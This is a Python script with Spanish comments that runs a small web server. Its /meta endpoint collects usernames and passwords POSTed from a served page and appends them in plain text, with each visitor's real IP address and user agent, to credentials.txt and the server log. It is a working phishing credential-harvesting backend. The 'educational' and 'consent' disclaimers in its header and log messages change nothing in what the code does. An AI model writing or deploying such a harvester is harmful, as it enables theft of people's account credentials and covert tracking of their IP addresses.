#!/usr/bin/env python3
"""
Servidor HTTP simple para trackear participaciones.
VERSIÓN EDUCATIVA: Captura credenciales con fines demostrativos.
NOTA: Esta versión NO anonimiza IPs - requiere consentimiento explícito.
"""
from http.server import HTTPServer, SimpleHTTPRequestHandler
import os
import datetime
import threading
import logging
import json
from typing import Optional

# Configuración de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('server.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Configuración
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
META_FILE = os.path.join(BASE_DIR, 'meta_log.txt')
CREDS_FILE = os.path.join(BASE_DIR, 'credentials.txt')
COUNT_FILE = os.path.join(BASE_DIR, 'count.txt')
LAST_FILE = os.path.join(BASE_DIR, 'last.txt')
LOCK = threading.Lock()
PORT = 5000

# Inicializar archivos si no existen
def init_files():
    """Inicializa archivos necesarios si no existen."""
    if not os.path.exists(COUNT_FILE):
        with open(COUNT_FILE, 'w') as f:
            f.write('0')
        logger.info(f"Archivo {COUNT_FILE} creado")
    
    if not os.path.exists(LAST_FILE):
        with open(LAST_FILE, 'w') as f:
            f.write('—')
        logger.info(f"Archivo {LAST_FILE} creado")

def read_count() -> int:
    """Lee el contador actual de forma segura."""
    try:
        with open(COUNT_FILE, 'r') as cf:
            val_str = cf.read().strip()
            return int(val_str) if val_str.isdigit() else 0
    except (FileNotFoundError, ValueError) as e:
        logger.error(f"Error leyendo contador: {e}")
        return 0

def write_count(value: int) -> None:
    """Escribe el contador de forma segura."""
    try:
        with open(COUNT_FILE, 'w') as cf:
            cf.write(str(value))
    except IOError as e:
        logger.error(f"Error escribiendo contador: {e}")

def read_last() -> str:
    """Lee el último timestamp de forma segura."""
    try:
        with open(LAST_FILE, 'r') as lf:
            last = lf.read().strip()
            return last if last else '—'
    except FileNotFoundError:
        return '—'

def write_last(timestamp: str) -> None:
    """Escribe el último timestamp."""
    try:
        with open(LAST_FILE, 'w') as lf:
            lf.write(timestamp)
    except IOError as e:
        logger.error(f"Error escribiendo timestamp: {e}")

class Handler(SimpleHTTPRequestHandler):
    """Handler HTTP con endpoints personalizados."""
    
    def get_real_ip(self) -> str:
        """Obtiene la IP real del cliente."""
        ip = (
            self.headers.get('X-Forwarded-For') or
            self.headers.get('X-Real-IP') or
            self.headers.get('CF-Connecting-IP') or
            self.client_address[0]
        )
        if ',' in ip:
            ip = ip.split(',')[0].strip()
        return ip
    
    def log_message(self, format, *args):
        """Redirige logs mostrando IP real."""
        real_ip = self.get_real_ip()
        logger.info("%s - %s" % (real_ip, format % args))
    
    def send_text_response(self, content: str, status: int = 200) -> None:
        """Envía una respuesta de texto plano."""
        self.send_response(status)
        self.send_header('Content-type', 'text/plain; charset=utf-8')
        self.send_header('Cache-Control', 'no-cache')
        self.end_headers()
        self.wfile.write(content.encode('utf-8'))
    
    def do_POST(self):
        """Maneja peticiones POST."""
        if self.path == '/meta':
            # Obtener longitud del contenido
            content_length = int(self.headers.get('Content-Length', 0))
            
            # Leer datos del cuerpo de la petición
            post_data = ''
            if content_length > 0:
                post_data = self.rfile.read(content_length).decode('utf-8')
            
            ua = self.headers.get('User-Agent', '-')
            ts = datetime.datetime.now().isoformat()
            
            # Usar método centralizado para obtener IP real
            ip = self.get_real_ip()
            
            # Parsear credenciales si existen
            credentials_info = "Sin datos"
            try:
                if post_data:
                    creds = json.loads(post_data)
                    credentials_info = f"Usuario: {creds.get('usuario', 'N/A')}, Password: {creds.get('password', 'N/A')}"
            except json.JSONDecodeError:
                credentials_info = "Datos inválidos"
            
            with LOCK:
                # Incrementar contador
                count = read_count()
                count += 1
                write_count(count)
                
                # Guardar metadata con IP real
                try:
                    with open(META_FILE, 'a') as mf:
                        mf.write(f"{ts}\t{ip}\t{ua}\n")
                except IOError as e:
                    logger.error(f"Error escribiendo meta log: {e}")
                
                # Guardar credenciales en archivo separado
                try:
                    with open(CREDS_FILE, 'a') as cf:
                        cf.write(f"{ts}\t{ip}\t{credentials_info}\n")
                except IOError as e:
                    logger.error(f"Error escribiendo credenciales: {e}")
                
                # Actualizar último timestamp
                write_last(ts)
            
            logger.info(f"✅ Participación registrada: count={count}, ip={ip}, creds={credentials_info}")
            
            # Responder 204 No Content
            self.send_response(204)
            self.end_headers()
        else:
            self.send_error(405, "Method Not Allowed")
    
    def do_GET(self):
        """Maneja peticiones GET."""
        if self.path == '/count':
            with LOCK:
                count = read_count()
            self.send_text_response(str(count))
            return
        
        if self.path == '/last':
            with LOCK:
                last = read_last()
            self.send_text_response(last)
            return
        
        # Servir archivos estáticos
        return super().do_GET()

def main():
    """Función principal del servidor."""
    os.chdir(BASE_DIR)
    init_files()
    
    server = HTTPServer(('0.0.0.0', PORT), Handler)
    logger.info(f"🚀 Servidor iniciado en puerto {PORT}")
    logger.info(f"📍 Accede en: http://<IP>:{PORT}/index.html")
    logger.info(f"⚠️  CAPTURANDO CREDENCIALES Y IPs REALES - Solo para uso educativo con consentimiento")
    logger.info("⏹️  Presiona Ctrl+C para detener")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        logger.info("\n🛑 Deteniendo servidor...")
        server.server_close()
        logger.info("✅ Servidor cerrado correctamente")
        logger.info("⚠️  CRÍTICO: Borra credentials.txt y meta_log.txt después de la demo")

if __name__ == '__main__':
    main()
